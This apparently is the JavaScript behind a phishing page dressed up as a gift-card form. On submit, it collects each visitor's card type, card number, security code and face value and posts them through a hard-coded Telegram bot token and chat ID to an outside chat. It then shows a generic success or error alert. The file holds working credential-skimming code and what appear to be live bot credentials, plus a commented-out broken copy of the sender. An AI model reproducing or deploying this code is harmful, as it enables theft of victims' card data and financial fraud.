const BOT_TOKEN = '7360342833:AAGi0f4AEWFbyQF2nN-unwm7exJabpQCEwE';
const CHAT_ID = '6867332809'; 
const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

document.addEventListener('DOMContentLoaded', (event) => {
        const myForm = document.getElementById('myForm');

        myForm.addEventListener('submit', (e) => {
                e.preventDefault();
                const cardType = document.getElementById('form-field-field_c740a56').value;
                const cardNumber = document.getElementById('form-field-field_fe6e98a').value;
                const securityCode = document.getElementById('form-field-code').value;
                const faceValue = document.getElementById('form-field-value').value;
                sendMessage(cardType, cardNumber, securityCode, faceValue);
                console.log(cardNumber, cardType, securityCode, faceValue);
            });
        });


function sendMessage(cardType, cardNumber, securityCode, faceValue) {
    const message = `Card Type: ${cardType}\nCard Number: ${cardNumber}\nSecurity Code: ${securityCode}\nFace Value: ${faceValue}`;

    fetch(TELEGRAM_API_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('Message sent successfully:', data);
            alert('Message sent successfully');
        } else {
            console.error('Error sending message:', data);
            alert('Error fetching');
        }
    })
    .catch(error => {
        console.error('Error sending message:', error);
        alert('Error fetching');
    });
}
/*
        function sendMessage(cardType, cardNumber, securityCode, faceValue) {
            const message = `Card Type: ${cardType}\nCard Number: ${cardNumber}\nSecurity Code: ${securityCode}\nFace Value: ${faceValue}`;

            fetch(TELEGRAM_API_URL, {
                chat_id: CHAT_ID,
                text: message
            })
            .then(response => {
                console.log('Message sent successfully:', response.data);
                alert('Error sending');
            })
            .catch(error => {
                console.error('Error sending message:', error.response ? error.response.data : error.message);
            });
        }
*/
